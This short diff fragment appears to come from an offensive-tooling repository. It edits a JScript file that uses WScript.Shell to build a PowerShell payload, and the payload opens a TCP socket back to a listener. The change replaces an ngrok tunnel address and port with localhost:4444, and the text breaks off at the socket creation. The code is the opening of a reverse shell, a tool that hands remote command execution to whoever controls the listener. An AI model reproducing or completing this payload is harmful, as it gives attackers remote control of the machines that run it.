@@ -12,8 +12,8 @@
 	<![CDATA[
 		var shell = new ActiveXObject("WScript.Shell");
 
-		var PsPayload = '$ip = "0.tcp.in.ngrok.io"\n' +
-		'$port = 16900\n' +
+		var PsPayload = '$ip = "127.0.0.1"\n' +
+		'$port = 4444\n' +
 		'Write-Host "IP address: $ip"\n' +
 		'Write-Host "Port number: $port"\n' +
 		'$socket = New-Object System.Net.Sockets.TcpClient($ip, $port)\n' +
